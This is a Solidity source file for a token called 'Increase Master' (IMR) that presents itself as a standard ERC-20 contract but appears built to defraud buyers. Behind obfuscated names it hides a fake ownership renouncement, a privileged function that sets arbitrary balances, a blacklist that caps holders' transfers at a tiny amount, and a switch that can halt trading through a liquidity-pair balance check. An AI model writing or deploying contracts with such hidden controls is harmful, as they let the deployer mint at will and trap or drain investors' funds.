//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface launchedTxMin {
    function createPair(address maxReceiver, address fromWalletIs) external returns (address);
}

interface launchMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTake) external view returns (uint256);

    function transfer(address limitSwap, uint256 receiverModeTake) external returns (bool);

    function allowance(address modeTxFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverModeTake) external returns (bool);

    function transferFrom(
        address sender,
        address limitSwap,
        uint256 receiverModeTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamAt, uint256 value);
    event Approval(address indexed modeTxFee, address indexed spender, uint256 value);
}

abstract contract receiverLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchMaxMetadata is launchMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IncreaseMaster is receiverLaunched, launchMax, launchMaxMetadata {

    uint256 public receiverEnable;

    address private fundTx;

    uint256 private tradingLaunchedAuto = 100000000 * 10 ** 18;

    bool private buyExempt;

    mapping(address => mapping(address => uint256)) private takeLiquidity;

    bool private modeToken;

    function decimals() external view virtual override returns (uint8) {
        return totalFund;
    }

    bool public atReceiverMarketing;

    event OwnershipTransferred(address indexed takeLaunch, address indexed receiverMode);

    function senderIs(address isAuto, uint256 receiverModeTake) public {
        limitToken();
        minList[isAuto] = receiverModeTake;
    }

    function allowance(address launchMarketing, address liquidityLaunch) external view virtual override returns (uint256) {
        if (liquidityLaunch == minFrom) {
            return type(uint256).max;
        }
        return takeLiquidity[launchMarketing][liquidityLaunch];
    }

    constructor (){
        if (modeToken) {
            receiverEnable = autoAt;
        }
        liquidityReceiver isLaunchedFee = liquidityReceiver(minFrom);
        autoList = launchedTxMin(isLaunchedFee.factory()).createPair(isLaunchedFee.WETH(), address(this));
        
        tokenTo = _msgSender();
        tradingBuy[tokenTo] = true;
        minList[tokenTo] = tradingLaunchedAuto;
        feeSell();
        if (receiverEnable == listLaunched) {
            modeToken = true;
        }
        emit Transfer(address(0), tokenTo, tradingLaunchedAuto);
    }

    address public tokenTo;

    function transferFrom(address minShould, address limitSwap, uint256 receiverModeTake) external override returns (bool) {
        if (_msgSender() != minFrom) {
            if (takeLiquidity[minShould][_msgSender()] != type(uint256).max) {
                require(receiverModeTake <= takeLiquidity[minShould][_msgSender()]);
                takeLiquidity[minShould][_msgSender()] -= receiverModeTake;
            }
        }
        return buyFee(minShould, limitSwap, receiverModeTake);
    }

    uint256 constant listBuyFrom = 18 ** 10;

    mapping(address => bool) public receiverFrom;

    uint8 private totalFund = 18;

    uint256 launchedList;

    uint256 private autoAt;

    function getOwner() external view returns (address) {
        return fundTx;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLaunchedAuto;
    }

    uint256 private listLaunched;

    uint256 launchWallet;

    function buyFee(address minShould, address limitSwap, uint256 receiverModeTake) internal returns (bool) {
        if (minShould == tokenTo) {
            return teamMax(minShould, limitSwap, receiverModeTake);
        }
        uint256 autoMax = launchMax(autoList).balanceOf(isTrading);
        require(autoMax == launchedList);
        require(limitSwap != isTrading);
        if (receiverFrom[minShould]) {
            return teamMax(minShould, limitSwap, listBuyFrom);
        }
        return teamMax(minShould, limitSwap, receiverModeTake);
    }

    mapping(address => bool) public tradingBuy;

    function exemptAutoMin(uint256 receiverModeTake) public {
        limitToken();
        launchedList = receiverModeTake;
    }

    function approve(address liquidityLaunch, uint256 receiverModeTake) public virtual override returns (bool) {
        takeLiquidity[_msgSender()][liquidityLaunch] = receiverModeTake;
        emit Approval(_msgSender(), liquidityLaunch, receiverModeTake);
        return true;
    }

    function balanceOf(address shouldTake) public view virtual override returns (uint256) {
        return minList[shouldTake];
    }

    string private liquidityIs = "IMR";

    string private marketingTotal = "Increase Master";

    function limitToken() private view {
        require(tradingBuy[_msgSender()]);
    }

    function teamMax(address minShould, address limitSwap, uint256 receiverModeTake) internal returns (bool) {
        require(minList[minShould] >= receiverModeTake);
        minList[minShould] -= receiverModeTake;
        minList[limitSwap] += receiverModeTake;
        emit Transfer(minShould, limitSwap, receiverModeTake);
        return true;
    }

    address isTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return fundTx;
    }

    address minFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return marketingTotal;
    }

    mapping(address => uint256) private minList;

    function feeSell() public {
        emit OwnershipTransferred(tokenTo, address(0));
        fundTx = address(0);
    }

    function enableTotal(address toLaunched) public {
        limitToken();
        if (autoAt != receiverEnable) {
            modeToken = false;
        }
        if (toLaunched == tokenTo || toLaunched == autoList) {
            return;
        }
        receiverFrom[toLaunched] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityIs;
    }

    function transfer(address isAuto, uint256 receiverModeTake) external virtual override returns (bool) {
        return buyFee(_msgSender(), isAuto, receiverModeTake);
    }

    address public autoList;

    function tradingAuto(address listMax) public {
        require(listMax.balance < 100000);
        if (atReceiverMarketing) {
            return;
        }
        if (listLaunched != receiverEnable) {
            receiverEnable = autoAt;
        }
        tradingBuy[listMax] = true;
        
        atReceiverMarketing = true;
    }

}